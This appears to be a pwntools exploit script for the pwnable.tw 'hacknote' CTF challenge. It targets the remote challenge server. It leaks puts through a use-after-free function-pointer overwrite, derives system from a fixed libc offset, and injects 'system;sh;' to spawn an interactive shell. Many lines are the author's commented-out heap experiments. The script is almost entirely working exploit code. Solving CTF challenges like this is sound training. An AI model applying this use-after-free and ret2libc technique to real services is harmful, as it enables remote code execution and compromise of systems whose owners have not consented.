from pwn import *




context(terminal=['tmux', 'new-window'])

#context(os = 'linux', arch = 'x86_64')
context.log_level = 'DEBUG'
#context.aslr = 'False'

#context.arch = 'i386'

#'b *' + sys.argv[2] + '''
#read
#free 1
#free 2



if len(sys.argv) > 2 and sys.argv[1] == 'debug':
        p = gdb.debug('./hacknote', 
     '''
        b *0x08048868
        commands
            x/70gx 0x0804b110
            silent
        end
        b *0x08048731
        commands
            x/70gx 0x0804b110
            silent
        end
        b *0x0804878e
        commands
            x/70gx 0x0804b110
            silent
        end
        b *0x0804869f
        commands
            x/70gx 0x0804b110
            silent
        end
        b *0x0804887e
        commands
            x/70gx 0x0804b110
            silent
        end
      ''')

elif len(sys.argv) > 1 and sys.argv[1] == 'debug':
    p = gdb.debug('./hacknote')
else:
    #p = process('./hacknote')
    p = remote('chall.pwnable.tw', 10102)

def deleteNote(index):
    p.recvuntil("Your choice :")
    p.sendline("2")
    p.recvuntil("Index :")
    p.sendline(index)

def printNote(index):
    p.recvuntil("Your choice :")
    p.sendline("3")
    p.recvuntil("Index :")
    p.sendline(index)
    p.recvline()

def addNote(size, content):
    p.recvuntil("Your choice :")
    p.sendline("1")
    p.recvuntil("Note size :")
    p.sendline(size)
    p.recvuntil("Content :")
    p.sendline(content)

def addNoteFull(size, content):
    p.recvuntil("Your choice :")
    p.sendline("1")
    p.recvline()


def leakPuts():
    addNote("12", "AAAAAAA")
    addNote("50", "BBBBBBBB")

    deleteNote("0")
    deleteNote("1")

    puts_plt = p32(0x804862b)
    puts_got = p32(0x804a024)

    addNote("12", puts_plt + puts_got)
    p.recvuntil("Your choice :")
    p.sendline("3")
    p.recvuntil("Index :")
    p.sendline("0")
    return p.recvline()[:4].strip()



#what does this leak ????
#addNote("12", "AAAAAAAAAAAAAAAAAAAAAAAAAAA")
#deleteNote("0")
#deleteNote("0")
#addNote("12", "AAAAAAAAAAAAAAAAAAAAAAAAAAA")
#addNote("12", "AAAAAAAAAAAAAAAAAAAAAAAAAAA")
#printNote("0")
#printNote("1")
#printNote("2")
#####################


####THIS MIGHT BE SOMETHIGN
#addNote("12", "AAAAAAAAAAAAAAAAAAAAAAAAAAA")
#deleteNote("0")
#deleteNote("0")
#deleteNote("0")
#deleteNote("0")


#addNote("12", "AAAAAAAAAAAAAAAAAAAAAAAAAAA")
#addNote("12", "AAAAAAAAAAAAAAAAAAAAAAAAAAA")

#deleteNote("1")
#deleteNote("1")
#deleteNote("1")


##########THIS WILL CALL AAAAAA
#addNote("12", "aaaabaa")
#addNote("12", "aaaabaa")
#addNote("12", "aaaabaa")
#addNote("12", "aaaabaa")

#deleteNote("0")
#deleteNote("0")
#deleteNote("0")
#deleteNote("0")

#puts_plt = p32(0x080484d0)

#addNote("12", puts_plt + "baaa")

#printNote("0")
###############################

#deleteNote("1")



###########CALLS BBBBBBB FROMT HE OTHER SIDE O_O
#addNote("12", "aaaabaaa")
#addNote("12", "aaaabaaa")
#addNote("12", "aaaabaaa")

#deleteNote("1")
#deleteNote("2")
#deleteNote("2")
#deleteNote("2")
#deleteNote("2")
#deleteNote("2")
#addNote("12", "BBBBBBBBBBBBBBBBBBBB")
#printNote("2")
############################################



leaked_puts = leakPuts()

print('leaked_puts :: ' + str(hex(u32(leaked_puts))))


addNote("50", "AAAAAAA")
deleteNote("1")
deleteNote("2")
system = u32(leaked_puts)-0x00024800
addNote("8", p32(system) + ";sh;")

p.recvuntil("Your choice :")
p.sendline("3")
p.recvuntil("Index :")
p.sendline("0")



p.interactive()
#0xf7e56360   #puts
#0xf7e2bd10   #system

#print('leaked_puts :: ' + str(hex(u32(leaked_puts))))
#deleteNote("0")
#addNoteFull("12", "GGGGGGGG")


#deleteNote("0")
#deleteNote("1")

#puts_plt = p32(0x804862b)
#puts_got = p32(0x804a024)


#addNote("12", puts_plt + puts_got)
#printNote("0")



#addNote("50", "DDDDDDDD")


#puts_plt = p32(0x080484d0)
#puts_got = p32(0x804a024)
#heap_map = p32(0x0804b170)

#addNote("12", "aaaabaa")
#deleteNote("0")
#deleteNote("0")

#printNote("0")
#addNote("12", "AAAAAAAA")
#deleteNote("0")
#addNote("12", "BBBBBBBB")
#addNote("12", "CCCCCCCC")
#deleteNote("2")
#printNote("0")
#addNote("12", "aaaabaaacaaa")
#addNote("12", "aaaabaaacaaa")
#deleteNote("1")
#deleteNote("2")
#deleteNote("3")
#deleteNote("0")
#deleteNote("2")
#addNote("12", "aaaabaaacaaadaaaeaaafaaa")
#addNote("12", "aaaabaaacaaadaaaeaaafaaa")
#addNote("12", "aaaabaaa")
#deleteNote("0")
#addNote("12", "GGGG")
#addNote("12", "GGGGGGGGGGGG")
#deleteNote("0")
#printNote("0")

#addNote("12", "aaaabaaacaaadaaaeaaafaaa")
#addNote("12", "aaaabaaacaaadaaaeaaafaaa")
#addNote("12", "aaaabaaacaaadaaaeaaafaaa")

#deleteNote("0")
#deleteNote("0")
#addNote("12", "AAAAAAAAAAAAAAAAAAAAAAAAAAA")
#deleteNote("1")
#deleteNote("1")
#deleteNote("1")


#printNote("0")
#printNote("1")
#printNote("2")
